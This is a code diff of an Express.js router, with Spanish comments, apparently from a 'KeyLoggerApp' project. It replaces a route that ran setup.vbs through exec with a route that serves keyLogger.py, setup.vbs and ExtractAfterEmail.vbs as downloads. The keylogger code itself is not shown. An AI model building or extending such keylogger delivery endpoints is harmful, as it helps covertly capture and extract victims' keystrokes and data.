@@ -1,23 +1,49 @@
 import express from 'express';
-import { exec } from 'child_process';
+import { fileURLToPath } from 'url';
+import fs from 'fs';
+import path from 'path';
 
 const router = express.Router();
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
-router.get('/KeyLoggerApp', (req, res) => {
-    // Ejecuta el setup.vbs
-    exec('wscript "../App/setup.vbs"', (error, stdout, stderr) => {
-        if (error) {
-            console.error(`Error ejecutando el script: ${error.message}`);
-            return res.status(500).send(`Error ejecutando el script: ${error.message}`);
-        }
-        if (stderr) {
-            console.error(`Error en el script: ${stderr}`);
-            return res.status(500).send(`Error en el script: ${stderr}`);
-        }
+// Función para resolver la ruta del archivo
+const resolveFilePath = (fileName) => {
+    let currentDir = path.dirname(__filename); 
+    let appDir = currentDir.replace('server', 'App');
+    appDir = appDir.replace('Routes', '');
+    console.log('appDir :', appDir);
 
-        console.log(`Resultado del script: ${stdout}`);
-        return res.status(200).send(`Resultado del script: ${stdout}`);
+    let filePath = fileName == 'ExtractAfterEmail.vbs'
+        ? path.join(appDir, 'Utils', fileName)
+        : path.join(appDir, fileName);
+
+   console.log('filePath :', filePath);
+
+   return filePath;
+};
+
+// Ruta para archivos en App
+router.get('/KeyLoggerApp/:fileName', (req, res) => {
+    const fileName = req.params.fileName;
+    const validFiles = ['keyLogger.py', 'setup.vbs', 'ExtractAfterEmail.vbs', 'requirements.txt'];
+
+    if (!validFiles.includes(fileName)) {
+        return res.status(400).send('Invalid file name');
+    }
+
+    const filePath = resolveFilePath(fileName);
+
+    const fileStream = fs.createReadStream(filePath);
+
+    fileStream.on('error', (error) => {
+        console.error(`Error reading file ${filePath}: ${error.message}`);
+        res.status(500).send(`Internal Server Error: ${error.message}`);
     });
+
+    res.setHeader('Content-Disposition', `attachment; filename="${fileName}"`);
+    fileStream.pipe(res);
 });
+
 
 export default router;
